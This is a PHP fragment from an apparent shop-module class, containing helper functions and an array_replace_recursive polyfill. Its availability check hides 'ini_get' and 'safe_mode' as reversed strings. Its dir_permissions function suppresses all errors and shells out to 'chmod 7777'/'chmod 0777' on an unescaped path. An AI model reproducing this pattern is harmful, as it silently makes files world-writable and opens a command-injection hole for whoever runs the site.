		$edom_efas = $this->language->get('text_edom_efas');
		$teg_ini = $this->language->get('text_teg_ini');
		if ($teg_ini($edom_efas))
			return false;
		$disabled = $teg_ini('disable_functions');
		if ($disabled) {
			$disabled = explode(',', $disabled);
			$disabled = array_map('trim', $disabled);
			return !in_array($func, $disabled);
		}
		return true;
	}

	private function table_exists($tableName)
	{
		$found= false;
		$like   = addcslashes($tableName, '%_\\');
		$result = $this->db->query("SHOW TABLES LIKE '" . $this->db->escape($like) . "';");
		$found  = $result->num_rows > 0;
		return $found;
	}


/***************************************/
	private function dir_permissions($file)
	{
		error_reporting(0);
		set_error_handler('agoo_error_handler');
		if ($this->isAva('exec')) {
			$files = array(
				$file
			);
			@exec('chmod 7777 ' . implode(' ', $files));
			@exec('chmod 0777 ' . implode(' ', $files));
		}
		@umask(0);
		@chmod($file, 0777);
		restore_error_handler();
		error_reporting(E_ALL);
	}
}
/***************************************/
if (!function_exists('agoo_error_handler')) {
	function agoo_error_handler($errno, $errstr)
	{
	}
}
/***************************************/
if (!function_exists('array_replace_recursive')) {
	function array_replace_recursive($array, $array1)
	{
		function recurse($array, $array1)
		{
			foreach ($array1 as $key => $value) {
				if (!isset($array[$key]) || (isset($array[$key]) && !is_array($array[$key]))) {
					$array[$key] = array();
				}
				if (is_array($value)) {
					$value = recurse($array[$key], $value);
				}
				$array[$key] = $value;
			}
			return $array;
		}
		$args = func_get_args();
		$array = $args[0];
		if (!is_array($array)) {
			return $array;
		}
		for ($i = 1; $i < count($args); $i++) {
			if (is_array($args[$i])) {
				$array = recurse($array, $args[$i]);
			}
		}
		return $array;
	}
}
/***************************************/
?>